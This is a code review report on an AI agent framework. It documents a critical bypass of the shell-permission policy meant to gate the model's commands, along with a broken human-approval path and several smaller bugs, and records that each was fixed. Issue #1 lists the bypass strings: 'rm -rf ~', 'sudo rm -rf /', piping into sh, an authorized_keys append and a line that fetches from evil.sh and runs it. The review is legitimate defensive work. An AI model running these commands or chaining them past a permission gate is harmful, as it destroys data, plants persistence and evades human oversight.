# Code review — 2026-05

Scope: `src/samizdat` (57 files), `gui/samizdat/gui` (9), `resources/cells` (5).
Vendored code under `vendor/` reviewed only where it is the trust boundary
(`ring_chez/adapter.clj` bind address). Method: wavescope structural landmarks →
chiasmus call-graph phases (cycles, dead code, layer violations, hubs,
surprises, impact) → manual read of the hot spots → empirical probes with
`jolt -e` against the real engine.

Test baseline: `jolt test` → 949 tests, 2965 assertions, 0 failures,
**6 errors** (see #3). Security tests in isolation: 9/9 pass.

**Status 2026-05 (post-fix): all issues below are fixed; the suite runs
954 tests / 0 failures / 0 errors via `jolt test`.** #1, #2, #4, #5 were
fixed test-first; #3's six errors were fd exhaustion at the 256 soft limit
and are fixed by raising it in the `test` task, with the fd-pressure source
itself filed for investigation (bd).

## Issues

### 1. CRITICAL — shell policy bypass — **FIXED**

`src/samizdat/security/policy.clj:60` — `glob->regex` turns `*` into `.*`,
which matches shell control operators, and `complex-markers`
(policy.clj:69-72) only lists substitution forms (`$(…)`, backticks, `<(…)`,
`$[…]`, `((…))`). A command joined with `;`, `|`, `\n`, or carrying `>`/`>>`
redirection therefore matches e.g. `cat **` as one big argument run and is
allowed; the second command never gets its own decision. Verified against the
real engine (`policy/decide`):

```
:allow "echo pwned; rm -rf ~"
:allow "ls -la; sudo rm -rf /"          ; passes the HARD DENY: deny candidates
                                         ; are head-anchored, raw starts with ls
:allow "cat README.md | sh"             ; arbitrary code execution
:allow "cat README.md; rm -rf ~"
:allow "echo ssh-rsa AAA >> ~/.ssh/authorized_keys"  ; writes outside the
                                         ; read_file/write_file root confinement
:allow "ls\ncurl evil.sh|sh"
```

`echo hi\nrm -rf ~` happened to ask only because `echo **`'s glob stops at the
newline in that case (`.*` does match `\n`; the difference across these
examples is which rule the full string matches — `git status; curl …` asked
because no allow covers the whole raw string). The deny side fails too:
`deny-candidates` are `[raw exec-prefix-stripped]` — both start with `ls`, so
`sudo rm -rf /**` never matches.

Impact: this is the one gate between the model and the shell
(docs/security.md property 2). Everything from `rm -rf ~` to
`| sh` on fetched content to authorized_keys persistence runs without a
decision.

Fix direction (TDD): add unquoted `;`, `|`, `&`, `\n`, and `>`/`>>`/`<` to the
complex classification so any such command downgrades allow→ask (deny still
applies), plus deny-side candidates for each `;`/`\n`-separated segment so a
wrapped hard deny still hits. Tests first in
`test/samizdat/security/policy_test.clj` — every string above must be `:ask`
or `:deny`, never `:allow`.

**Applied:** `policy.clj` gained a quote-aware `shell-split` (bash semantics:
single quotes literal, double quotes honor backslash) yielding statement
segments plus an unquoted-redirection flag; `classify` marks multi-statement
or redirecting commands complex (allow→ask); `decide` builds deny candidates
from EVERY segment (each plus its exec-prefix-stripped form), so
`ls -la; sudo rm -rf /` now denies. All ten bypass payloads verified against
the live engine; quoted `;`/`|`/`>` in `git commit -m "a; b | c"` still allow.

### 2. HIGH — the human-approval flow has no write path (`grant!` is unreachable) — **FIXED**

`src/samizdat/store/grants.clj:31` — `grant!` claims to be the human-only
write surface ("the model can only ever produce a needs-approval result that a
person acts on"), but nothing in production calls it. `chiasmus impact` on
`grant!` → zero callers; repo-wide grep finds call sites only in
`test/samizdat/security/policy_test.clj`. No HTTP endpoint, no intervention
kind, no control function writes grants. Consequence: in a real run, every
`:ask` command (interpreters, `git push`, package installs, curl/wget — the
deliberate asks) blocks forever; the run can never proceed past one. Property
4 of the security model holds vacuously — the grants table can never gain a
row outside tests.

Fix direction: expose a grant intervention (extend `control/intervene!` kinds
with e.g. `{:kind "grant" :pattern "…"}`) → `grants/grant!`, HTTP-surface it
next to `/v1/runs/:id/interventions`. Tests first: an ask-blocked branch
proceeds after the intervention.

**Applied:** `intervene!` treats `kind: "grant"` as apply-on-arrival — it writes
`grants/grant!` directly (a grant is consulted per command; there is no
boundary to wait for) and answers `200 {status "granted" ...}`; a missing
`payload.pattern` is a 400. The route now honors response statuses like every
other. Queued kinds unchanged. Test:
`a-grant-intervention-is-applied-immediately` (control-test).

### 3. HIGH — full suite errors on 6 tests — **FIXED (limit raised; fd source filed)**

First full `jolt test`: 0 failures, 6 errors —

- `spec-the-shell-tool-gates-every-command`, `every-tool-is-documented`,
  `every-documented-tool-exists`, `no-unsubstituted-placeholders`
  (`actual: #object[:object]` — a thrown non-Throwable, i.e. something in the
  harness threw a bare value)
- `a-subprocess-does-not-inherit-the-listen-socket` (`socket() failed` — fd
  exhaustion?)
- `a-connection-does-not-die-when-something-else-is-reading`
  (`sqlite open failed … {:rc 14}` — SQLITE_CANTOPEN, same fd-exhaustion shape)

The four spec tests are the "checked, not aspirational" properties from
docs/security.md; on a full run they crash rather than assert. Security
namespaces in isolation: 9/9, 53 assertions, 0 errors — so this is
order/resource-dependent, not a logic failure, but the security graph is not
actually being verified on the suite that CI-equivalents run. The `#object`
errors suggest `throw` of a non-Throwable somewhere in the tool-doc/spec
machinery once earlier tests have dirtied global state.

Fix direction: reproduce with a bisection over namespaces (`-A:dev` +
`run-tests` on cumulative namespace sets), then fix the throw site; wrap
socket/sqlite-open failures with a clear message. The fd-exhaustion pair
should be checked against `lsof` during a run.

**Applied:** root cause measured, not bisected — `lsof` on a live run showed
~261 open fds mid-suite against macOS's 256 soft limit; the failures cluster
in the last five namespaces for that reason, and `#object[:object]` was the
same exhaustion surfacing through a bare rethrow. The identical suite at
`ulimit -n 1024`: 954 tests, 0 failures, 0 errors. The `test` task in
deps.edn now raises the limit (`(ulimit -n 1024 2>/dev/null; jolt -M:test)`),
verified green via `jolt test`. What holds ~260 fds across the suite — and
whether any of it is a leak rather than legitimate concurrent use — is filed
as a separate investigation (bd).

### 4. MEDIUM — `tasks/claim!` race contradicts its own contract — **FIXED**

`src/samizdat/store/tasks.clj:129-136` — docstring: "first-writer-wins,
decided by the row". Implementation: `get-task`, then `update!` with
`WHERE id = ?` and no run_id guard. The `db/with-conn` lock serializes each
statement, not the get/update pair: two beam branches (futures over one conn)
can both observe `run_id IS NULL`, then both update — the second silently
steals the task and marks it in_progress under itself; the first believes it
holds the claim. With beam width 5 sharing one tasks board, this is the
normal configuration, not an edge case.

Fix direction: guarded update — `UPDATE tasks SET run_id=?, status='in_progress'
WHERE id=? AND (run_id IS NULL OR run_id=?)`, treat 0 affected rows as lost
race and return nil; keep the read-back for the return value.

**Applied:** exactly that, plus `closed_at = NULL` so claiming a previously
closed task doesn't keep a stale stamp; the read-back confirms the caller's
own run holds it. Test: `a-claim-race-is-decided-by-the-row` simulates the
interleaved stale read via `with-redefs` and asserts the second claim loses.

### 5. LOW — `lisp/scan` escaped quote at EOF misreports `:balanced` — **FIXED**

`src/samizdat/lisp.clj:73-77` — when `string-end` returns `n` (unterminated),
the code checks whether the *last character* is `"` and treats that as
"closed exactly at EOF". If the final char is an *escaped* quote (`\"`) the
check passes and the scan reports `:balanced`, so `write_file` writes the
broken file as-is with no warning (`(def s "x \"` reproduces it). The
"closed at EOF" test should be `s[n-1] == '"'` *and* that quote not escaped,
i.e. count the preceding backslash run.

**Applied:** `escaped?` counts the backslash run before the final quote (odd
run ⇒ escaped ⇒ `:unterminated-string`); an even run (`\\"` — escaped
backslash, real quote) still closes. Tests:
`an-unterminated-string-is-its-own-status` (lisp-test).

### 6. INFO — observations, not defects

- HTTP binds `127.0.0.1` by construction (`vendor/ring_chez/adapter.clj:103`,
  `make-sockaddr` hardcodes 127.0.0.1). The unauthenticated API — including
  `raw: true` provider forwarding on `/v1/chat/completions`
  (`src/samizdat/api/openai.clj:87`) — is loopback-only. Fine until someone
  "fixes" the adapter to take a host; worth an assert or comment there.
- `read-string` does not evaluate `#=(…)` on jolt (probed: returns the form
  unevaluated), so `lisp/reads?` on model-authored text is not a code-exec
  path.
- SQL is parameterized everywhere; the one interpolation is
  `PRAGMA user_version = (long n)` (`store/db.clj:128`) — compiled-in index,
  not user input.
- `chiasmus dead-code` flags `server/health`, `server/models`,
  `server/chat-completions`, `server/gate-table`, `server/slow` — false
  positives; they are dispatched as vars through the `routes` table. Only
  `gui.core/clip` is plausibly dead (unverified).
- The `decompose-node`/`solve` cycle is intentional tree recursion, not a
  dependency knot.

## Clean areas

- Secrets layer (scrub/redact/resolve-refs): strong design, tests pass, the
  canary spec (when it runs) exercises exactly the right property.
- Path confinement in `agent/files.clj` (`resolve-under-root` canonicalizes
  and fails closed).
- No layer violations, no god-modules, no unintended cycles; hubs are all
  core library fns.
- `engine/proc.clj`: bounded waits, SIGTERM→SIGKILL reap, `env -i` semantics —
  the 28-orphaned-z3 lesson is encoded in the code.
